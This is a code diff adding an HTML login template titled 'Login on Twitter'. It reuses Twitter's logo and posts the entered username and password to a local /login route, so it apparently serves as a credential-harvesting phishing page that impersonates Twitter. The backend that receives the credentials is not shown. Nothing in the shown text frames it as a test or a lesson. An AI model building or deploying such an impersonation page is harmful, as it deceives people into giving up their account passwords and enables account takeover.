@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login on Twitter</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <img src="https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc727a.png" alt="Twitter Logo" class="logo">
+        <h2>Sign in to Twitter</h2>
+        <form method="POST" action="/login">
+            <input type="text" name="username" placeholder="Phone, email, or username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="spinner" id="spinner" style="display:none;"></div>
+    </div>
+    <script>
+        const form = document.querySelector('form');
+        const spinner = document.getElementById('spinner');
+
+        form.addEventListener('submit', () => {
+            spinner.style.display = 'block';
+        });
+    </script>
+</body>
+</html>
